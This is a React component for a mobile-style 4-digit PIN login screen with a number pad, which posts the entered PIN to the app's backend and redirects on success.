import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import { User } from "lucide-react";

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [username, setUsername] = useState("");

  useEffect(() => {
    const storedUsername = localStorage.getItem("username");
    if (storedUsername) {
      setUsername(storedUsername);
    }
  }, []);

  const handleNumberClick = (num) => {
    if (pin.length < 4) {
      setPin(pin + num);
    }
  };

  const handleBackspace = () => {
    setPin(pin.slice(0, -1));
  };

  const handleSubmit = async () => {
    if (pin.length !== 4) return;

    setLoading(true);
    try {
      await axios.post(`${BASE_URL}/pin`, { pin });
      // Navigate to next page or show success
      navigate("/");
    } catch (err) {
      console.error("PIN submission failed:", err);
      setPin("");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (pin.length === 4 && !loading) {
      handleSubmit();
    }
  }, [pin]);

  return (
    <div className="min-h-screen bg-white text-gray-900 flex flex-col">
      {/* Header */}
      <div className="px-6 pt-8">
        {/* Profile Icon */}
        <div className="w-16 h-16 bg-gray-300 rounded-full flex items-center justify-center mb-8">
          <User size={32} className="text-gray-600" />
        </div>

        {/* Title */}
        <h1 className="text-3xl font-bold mb-2">Welcome back ,</h1>
        <h2 className="text-2xl font-semibold mb-4">Enter your 4-Digit PIN</h2>

        {/* Log out link */}
        <p className="text-gray-600">
          Not your account?{" "}
          <span className="underline font-medium cursor-pointer">Log out</span>
        </p>

        {/* PIN Display */}
        <div className="flex justify-start gap-4 my-12 bg-gray-100 rounded-full py-4 px-8 w-fit">
          {[0, 1, 2, 3].map((index) => (
            <div
              key={index}
              className={`w-3 h-3 rounded-full ${
                pin.length > index ? "bg-gray-800" : "bg-gray-400"
              }`}
            />
          ))}
        </div>
      </div>

      {/* Spacer */}
      <div className="flex-grow" />

      {/* Number Pad */}
      <div className="px-6 pb-8">
        <div className="grid grid-cols-3 gap-4 max-w-sm mx-auto">
          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
            <button
              key={num}
              onClick={() => handleNumberClick(num.toString())}
              className="h-20 text-3xl font-semibold rounded-lg hover:bg-gray-100 active:bg-gray-200 transition-colors"
              disabled={loading}
            >
              {num}
            </button>
          ))}

          {/* Face ID Button */}
          <button className="h-20 flex items-center justify-center rounded-lg hover:bg-gray-100">
            <svg
              className="w-8 h-8"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <rect x="3" y="3" width="18" height="18" rx="2" />
              <circle cx="8" cy="10" r="1.5" />
              <circle cx="16" cy="10" r="1.5" />
              <path d="M9 16c.5.67 1.5 1 3 1s2.5-.33 3-1" />
            </svg>
          </button>

          {/* Zero Button */}
          <button
            onClick={() => handleNumberClick("0")}
            className="h-20 text-3xl font-semibold rounded-lg hover:bg-gray-100 active:bg-gray-200 transition-colors"
            disabled={loading}
          >
            0
          </button>

          {/* Backspace Button */}
          <button
            onClick={handleBackspace}
            className="h-20 flex items-center justify-center rounded-lg hover:bg-gray-100 active:bg-gray-200 transition-colors"
            disabled={loading}
          >
            <svg
              className="w-8 h-8 text-red-500"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M7 7l10 10M7 17L17 7" />
            </svg>
          </button>
        </div>
      </div>

      {/* Bottom Bar */}
      <div className="h-1 bg-black mx-auto w-32 rounded-full mb-4" />
    </div>
  );
};

export default Pin;
